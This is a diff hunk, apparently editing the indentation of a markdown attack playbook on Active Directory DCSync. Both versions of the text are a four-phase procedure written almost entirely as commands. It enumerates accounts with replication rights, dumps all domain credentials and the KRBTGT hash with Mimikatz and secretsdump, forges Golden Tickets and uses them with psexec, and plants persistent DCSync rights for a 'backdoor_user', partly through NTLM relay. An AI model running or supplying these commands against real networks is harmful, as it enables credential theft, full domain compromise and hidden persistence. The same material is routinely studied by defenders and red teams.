@@ -75,97 +75,97 @@ DCSync is an attack technique that abuses the Microsoft Directory Replication Se
 
 ### Phase 1: Identify Accounts with DCSync Rights
 1. Enumerate principals with replication rights:
-   ```powershell
-   # Using PowerView
-   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
-     Where-Object { ($_.ObjectAceType -match 'Replicating') -and
-                    ($_.ActiveDirectoryRights -match 'ExtendedRight') } |
-     Select-Object SecurityIdentifier, ObjectAceType
+ ```powershell
+ # Using PowerView
+ Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
+ Where-Object { ($_.ObjectAceType -match 'Replicating') -and
+ ($_.ActiveDirectoryRights -match 'ExtendedRight') } |
+ Select-Object SecurityIdentifier, ObjectAceType
 
-   # Using BloodHound Cypher query
-   MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
-   RETURN u.name, d.name
-   ```
+ # Using BloodHound Cypher query
+ MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
+ RETURN u.name, d.name
+ ```
 2. Using Impacket's FindDelegation or custom LDAP query:
-   ```bash
-   # Check with Impacket
-   findDelegation.py domain.local/user:'Password123' -dc-ip 10.10.10.1
-   ```
+ ```bash
+ # Check with Impacket
+ findDelegation.py domain.local/user:'Password123' -dc-ip 10.10.10.1
+ ```
 3. Default accounts with DCSync rights:
-   - Domain Admins
-   - Enterprise Admins
-   - Domain Controllers group
-   - SYSTEM on Domain Controllers
+ - Domain Admins
+ - Enterprise Admins
+ - Domain Controllers group
+ - SYSTEM on Domain Controllers
 
 ### Phase 2: DCSync Credential Extraction
 1. Using Mimikatz (Windows):
-   ```powershell
-   # Dump specific account (KRBTGT for Golden Ticket)
-   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
+ ```powershell
+ # Dump specific account (KRBTGT for Golden Ticket)
+ mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
 
-   # Dump Domain Admin
-   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"
+ # Dump Domain Admin
+ mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"
 
-   # Dump all domain accounts
-   mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
-   ```
+ # Dump all domain accounts
+ mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
+ ```
 2. Using Impacket secretsdump.py (Linux):
-   ```bash
-   # Dump all credentials
-   secretsdump.py domain.local/admin:'Password123'@10.10.10.1
+ ```bash
+ # Dump all credentials
+ secretsdump.py domain.local/admin:'Password123'@10.10.10.1
 
-   # Dump specific user
-   secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1
+ # Dump specific user
+ secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1
 
-   # Dump only NTLM hashes (no Kerberos keys)
-   secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1
+ # Dump only NTLM hashes (no Kerberos keys)
+ secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1
 
-   # Using Kerberos authentication
-   export KRB5CCNAME=admin.ccache
-   secretsdump.py -k -no-pass domain.local/admin@DC01.domain.local
-   ```
+ # Using Kerberos authentication
+ export KRB5CCNAME=admin.ccache
+ secretsdump.py -k -no-pass domain.local/admin@DC01.domain.local
+ ```
 
 ### Phase 3: Golden Ticket Creation
 1. Using Mimikatz with extracted KRBTGT hash:
-   ```powershell
-   # Create Golden Ticket
-   mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local \
-     /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
-     /krbtgt:<krbtgt_ntlm_hash> /ptt"
+ ```powershell
+ # Create Golden Ticket
+ mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local \
+ /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
+ /krbtgt:<krbtgt_ntlm_hash> /ptt"
 
-   # Create with specific group memberships
-   mimikatz.exe "kerberos::golden /user:fakeadmin /domain:domain.local \
-     /sid:S-1-5-21-XXXXXXXXXX \
-     /krbtgt:<krbtgt_ntlm_hash> \
-     /groups:512,513,518,519,520 /ptt"
-   ```
+ # Create with specific group memberships
+ mimikatz.exe "kerberos::golden /user:fakeadmin /domain:domain.local \
+ /sid:S-1-5-21-XXXXXXXXXX \
+ /krbtgt:<krbtgt_ntlm_hash> \
+ /groups:512,513,518,519,520 /ptt"
+ ```
 2. Using Impacket ticketer.py (Linux):
-   ```bash
-   # Create Golden Ticket
-   ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \
-     -domain domain.local administrator
+ ```bash
+ # Create Golden Ticket
+ ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \
+ -domain domain.local administrator
 
-   # Use the ticket
-   export KRB5CCNAME=administrator.ccache
-   psexec.py -k -no-pass domain.local/administrator@DC01.domain.local
-   ```
+ # Use the ticket
+ export KRB5CCNAME=administrator.ccache
+ psexec.py -k -no-pass domain.local/administrator@DC01.domain.local
+ ```
 
 ### Phase 4: Persistence via DCSync Rights
 1. Grant DCSync rights to a controlled account for persistence:
-   ```powershell
-   # Using PowerView - Add DS-Replication-Get-Changes-All rights
-   Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
-     -PrincipalIdentity backdoor_user -Rights DCSync
+ ```powershell
+ # Using PowerView - Add DS-Replication-Get-Changes-All rights
+ Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
+ -PrincipalIdentity backdoor_user -Rights DCSync
 
-   # Verify rights were added
-   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
-     Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }
-   ```
+ # Verify rights were added
+ Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
+ Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }
+ ```
 2. Using ntlmrelayx.py for automated DCSync rights escalation:
-   ```bash
-   # Relay authentication to add DCSync rights
-   ntlmrelayx.py -t ldap://DC01.domain.local --escalate-user backdoor_user
-   ```
+ ```bash
+ # Relay authentication to add DCSync rights
+ ntlmrelayx.py -t ldap://DC01.domain.local --escalate-user backdoor_user
+ ```
 
 ## Tools and Resources
 
